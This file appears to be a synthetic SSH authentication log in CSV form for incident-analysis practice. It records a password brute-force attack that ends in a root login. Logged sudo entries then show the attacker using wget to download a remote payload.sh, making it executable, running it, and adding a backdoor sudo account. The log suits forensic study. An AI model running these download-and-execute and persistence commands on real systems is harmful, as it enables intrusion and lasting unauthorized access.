timestamp,source_ip,username,auth_method,result,message,port
2026-01-29 10:17:59,185.220.101.47,admin,password,FAILURE,"Failed password",61246
2026-01-29 10:18:05,185.220.101.47,ubuntu,password,FAILURE,"Failed password",33727
2026-01-29 10:18:11,185.220.101.47,root,password,FAILURE,"Failed password",42178
2026-01-29 10:18:13,185.220.101.47,root,password,FAILURE,"Failed password",45414
2026-01-29 10:18:18,185.220.101.47,root,password,FAILURE,"Failed password",46135
2026-01-29 10:18:24,185.220.101.47,admin,password,FAILURE,"Failed password",35372
2026-01-29 10:18:29,10.0.2.15,carol,publickey,SUCCESS,"Accepted publickey",46693
2026-01-29 10:19:09,185.220.101.47,test,password,FAILURE,"Failed password",47407
2026-01-29 10:19:14,185.220.101.47,ubuntu,password,FAILURE,"Failed password",49660
2026-01-29 10:19:19,185.220.101.47,oracle,password,FAILURE,"Failed password",34754
2026-01-29 10:19:21,185.220.101.47,deploy,password,FAILURE,"Failed password",36552
2026-01-29 10:19:23,185.220.101.47,test,password,FAILURE,"Failed password",63153
2026-01-29 10:19:27,185.220.101.47,ubuntu,password,FAILURE,"Failed password",52872
2026-01-29 10:19:29,185.220.101.47,test,password,FAILURE,"Failed password",54217
2026-01-29 10:19:33,185.220.101.47,ubuntu,password,FAILURE,"Failed password",58716
2026-01-29 10:19:41,185.220.101.47,postgres,password,FAILURE,"Failed password",64664
2026-01-29 10:19:43,185.220.101.47,postgres,password,FAILURE,"Failed password",36788
2026-01-29 10:19:46,185.220.101.47,postgres,password,FAILURE,"Failed password",37564
2026-01-29 10:19:48,185.220.101.47,ubuntu,password,FAILURE,"Failed password",47848
2026-01-29 10:19:52,10.0.1.87,carol,publickey,SUCCESS,"Accepted publickey",46671
2026-01-29 10:20:52,185.220.101.47,postgres,password,FAILURE,"Failed password",63122
2026-01-29 10:20:57,185.220.101.47,postgres,password,FAILURE,"Failed password",33329
2026-01-29 10:20:59,185.220.101.47,git,password,FAILURE,"Failed password",48132
2026-01-29 10:21:01,185.220.101.47,admin,password,FAILURE,"Failed password",51859
2026-01-29 10:21:09,185.220.101.47,ubuntu,password,FAILURE,"Failed password",47167
2026-01-29 10:21:12,185.220.101.47,deploy,password,FAILURE,"Failed password",58028
2026-01-29 10:21:18,185.220.101.47,admin,password,FAILURE,"Failed password",37331
2026-01-29 10:21:20,185.220.101.47,ubuntu,password,FAILURE,"Failed password",32361
2026-01-29 10:21:28,185.220.101.47,oracle,password,FAILURE,"Failed password",39705
2026-01-29 10:21:33,185.220.101.47,ubuntu,password,FAILURE,"Failed password",32741
2026-01-29 10:21:37,185.220.101.47,oracle,password,FAILURE,"Failed password",32614
2026-01-29 10:21:41,185.220.101.47,test,password,FAILURE,"Failed password",46353
2026-01-29 10:21:48,10.0.1.42,carol,publickey,SUCCESS,"Accepted publickey",58346
2026-01-29 10:22:34,185.220.101.47,ubuntu,password,FAILURE,"Failed password",45514
2026-01-29 10:22:42,185.220.101.47,ubuntu,password,FAILURE,"Failed password",41603
2026-01-29 10:22:47,185.220.101.47,admin,password,FAILURE,"Failed password",41754
2026-01-29 10:22:54,185.220.101.47,oracle,password,FAILURE,"Failed password",56982
2026-01-29 10:23:02,185.220.101.47,test,password,FAILURE,"Failed password",47485
2026-01-29 10:23:05,185.220.101.47,root,password,FAILURE,"Failed password",55070
2026-01-29 10:23:13,185.220.101.47,admin,password,FAILURE,"Failed password",60847
2026-01-29 10:23:16,185.220.101.47,test,password,FAILURE,"Failed password",60166
2026-01-29 10:23:20,185.220.101.47,postgres,password,FAILURE,"Failed password",44915
2026-01-29 10:23:23,185.220.101.47,admin,password,FAILURE,"Failed password",42656
2026-01-29 10:23:28,185.220.101.47,oracle,password,FAILURE,"Failed password",48258
2026-01-29 10:23:36,185.220.101.47,root,password,FAILURE,"Failed password",48292
2026-01-29 10:23:40,10.0.2.103,carol,publickey,SUCCESS,"Accepted publickey",40904
2026-01-29 10:24:07,185.220.101.47,postgres,password,FAILURE,"Failed password",41702
2026-01-29 10:24:13,185.220.101.47,postgres,password,FAILURE,"Failed password",32507
2026-01-29 10:24:15,185.220.101.47,git,password,FAILURE,"Failed password",52654
2026-01-29 10:24:22,185.220.101.47,oracle,password,FAILURE,"Failed password",58599
2026-01-29 10:24:28,185.220.101.47,root,password,FAILURE,"Failed password",55244
2026-01-29 10:24:34,185.220.101.47,test,password,FAILURE,"Failed password",46693
2026-01-29 10:24:36,185.220.101.47,git,password,FAILURE,"Failed password",30110
2026-01-29 10:24:42,185.220.101.47,test,password,FAILURE,"Failed password",53869
2026-01-29 10:24:47,185.220.101.47,root,password,FAILURE,"Failed password",51639
2026-01-29 10:24:53,185.220.101.47,oracle,password,FAILURE,"Failed password",38167
2026-01-29 10:25:00,185.220.101.47,postgres,password,FAILURE,"Failed password",63234
2026-01-29 10:25:04,185.220.101.47,git,password,FAILURE,"Failed password",51376
2026-01-29 10:25:09,10.0.2.15,bob,publickey,SUCCESS,"Accepted publickey",46286
2026-01-29 10:25:55,185.220.101.47,git,password,FAILURE,"Failed password",41405
2026-01-29 10:26:01,185.220.101.47,postgres,password,FAILURE,"Failed password",56612
2026-01-29 10:26:07,185.220.101.47,admin,password,FAILURE,"Failed password",49914
2026-01-29 10:26:11,185.220.101.47,test,password,FAILURE,"Failed password",58173
2026-01-29 10:26:19,185.220.101.47,oracle,password,FAILURE,"Failed password",60473
2026-01-29 10:26:24,185.220.101.47,deploy,password,FAILURE,"Failed password",44005
2026-01-29 10:26:30,185.220.101.47,deploy,password,FAILURE,"Failed password",41120
2026-01-29 10:26:37,185.220.101.47,root,password,SUCCESS,"Accepted password",35557
2026-01-29 10:26:40,185.220.101.47,root,sudo,SUCCESS,"session opened for user root",48598
2026-01-29 10:27:01,185.220.101.47,root,sudo,SUCCESS,"COMMAND=/usr/bin/wget http://185.220.101.47/payload.sh",51966
2026-01-29 10:27:08,185.220.101.47,root,sudo,SUCCESS,"COMMAND=/bin/chmod +x /tmp/payload.sh",45392
2026-01-29 10:27:22,185.220.101.47,root,sudo,SUCCESS,"COMMAND=/tmp/payload.sh",44722
2026-01-29 10:27:33,185.220.101.47,root,sudo,SUCCESS,"COMMAND=/usr/sbin/useradd -m -s /bin/bash backup_svc",39656
2026-01-29 10:27:38,185.220.101.47,root,sudo,SUCCESS,"COMMAND=/usr/sbin/usermod -aG sudo backup_svc",33028
2026-01-29 10:27:50,185.220.101.47,root,sudo,SUCCESS,"COMMAND=/usr/bin/passwd backup_svc",61138
2026-01-29 10:28:14,91.219.236.222,backup_svc,password,SUCCESS,"Accepted password",34772
2026-01-29 10:28:26,91.219.236.222,backup_svc,sudo,SUCCESS,"session opened for user root",59846
2026-01-29 10:28:34,10.0.2.103,bob,publickey,SUCCESS,"Accepted publickey",63538
2026-01-29 10:29:57,10.0.2.103,bob,publickey,SUCCESS,"Accepted publickey",44835
2026-01-29 10:30:17,10.0.1.42,dave,publickey,SUCCESS,"Accepted publickey",47170
2026-01-29 10:32:06,10.0.2.103,alice,publickey,SUCCESS,"Accepted publickey",58265
2026-01-29 10:32:41,10.0.2.103,bob,publickey,SUCCESS,"Accepted publickey",55225
2026-01-29 10:34:12,10.0.2.15,dave,publickey,SUCCESS,"Accepted publickey",60075
2026-01-29 10:35:36,10.0.2.103,dave,publickey,SUCCESS,"Accepted publickey",45215
2026-01-29 10:36:56,10.0.2.103,carol,publickey,SUCCESS,"Accepted publickey",64634
2026-01-29 10:38:37,10.0.2.15,dave,publickey,SUCCESS,"Accepted publickey",60537
2026-01-29 10:39:53,10.0.1.42,carol,publickey,SUCCESS,"Accepted publickey",47683
2026-01-29 10:40:53,10.0.1.42,bob,publickey,SUCCESS,"Accepted publickey",44942
2026-01-29 10:42:41,10.0.1.87,bob,publickey,SUCCESS,"Accepted publickey",42104
2026-01-29 10:43:43,10.0.2.103,dave,publickey,SUCCESS,"Accepted publickey",42040
2026-01-29 10:44:56,10.0.2.103,alice,publickey,SUCCESS,"Accepted publickey",58864
2026-01-29 10:45:16,10.0.2.15,carol,publickey,SUCCESS,"Accepted publickey",64689
2026-01-29 10:46:29,10.0.1.87,dave,publickey,SUCCESS,"Accepted publickey",47190
2026-01-29 10:47:51,10.0.1.42,dave,publickey,SUCCESS,"Accepted publickey",51014
2026-01-29 10:49:02,10.0.1.87,dave,publickey,FAILURE,"Connection closed by client",44182
2026-01-29 10:50:30,10.0.1.42,dave,publickey,SUCCESS,"Accepted publickey",59395
2026-01-29 10:50:53,10.0.1.42,dave,publickey,SUCCESS,"Accepted publickey",44446
2026-01-29 10:51:36,10.0.1.42,carol,publickey,SUCCESS,"Accepted publickey",52422
2026-01-29 10:52:54,10.0.2.15,carol,publickey,SUCCESS,"Accepted publickey",64943
2026-01-29 10:53:49,10.0.2.103,carol,publickey,SUCCESS,"Accepted publickey",42683
2026-01-29 10:55:44,10.0.1.42,carol,publickey,SUCCESS,"Accepted publickey",47347
2026-01-29 10:57:43,10.0.1.42,alice,publickey,SUCCESS,"Accepted publickey",48102
2026-01-29 10:58:05,10.0.1.87,bob,publickey,SUCCESS,"Accepted publickey",44136
2026-01-29 10:58:39,10.0.1.87,dave,publickey,SUCCESS,"Accepted publickey",62920
2026-01-29 10:59:46,10.0.1.87,alice,publickey,FAILURE,"Connection closed by client",45366
2026-01-29 11:00:19,10.0.1.42,carol,publickey,SUCCESS,"Accepted publickey",58867
2026-01-29 11:01:27,10.0.2.103,bob,publickey,SUCCESS,"Accepted publickey",42490
2026-01-29 11:03:07,10.0.1.87,alice,publickey,SUCCESS,"Accepted publickey",62845
2026-01-29 11:04:54,10.0.1.42,alice,publickey,SUCCESS,"Accepted publickey",51377
2026-01-29 11:06:38,10.0.2.15,alice,publickey,SUCCESS,"Accepted publickey",56579
2026-01-29 11:06:59,10.0.2.103,dave,publickey,SUCCESS,"Accepted publickey",43458
2026-01-29 11:08:05,10.0.2.103,bob,publickey,SUCCESS,"Accepted publickey",54270
2026-01-29 11:09:31,10.0.2.15,dave,publickey,SUCCESS,"Accepted publickey",55232
2026-01-29 11:11:24,10.0.2.15,carol,publickey,SUCCESS,"Accepted publickey",48044
2026-01-29 11:11:55,10.0.2.15,dave,publickey,SUCCESS,"Accepted publickey",47990
2026-01-29 11:13:27,10.0.2.103,carol,publickey,SUCCESS,"Accepted publickey",40940
2026-01-29 11:14:28,10.0.1.87,dave,publickey,SUCCESS,"Accepted publickey",46950
2026-01-29 11:15:21,10.0.2.15,carol,publickey,SUCCESS,"Accepted publickey",59534
2026-01-29 11:16:16,10.0.1.42,bob,publickey,SUCCESS,"Accepted publickey",42805
2026-01-29 11:17:28,10.0.2.103,bob,publickey,SUCCESS,"Accepted publickey",62629
2026-01-29 11:19:19,10.0.2.103,dave,publickey,SUCCESS,"Accepted publickey",40565
2026-01-29 11:20:07,10.0.2.103,bob,publickey,SUCCESS,"Accepted publickey",50033
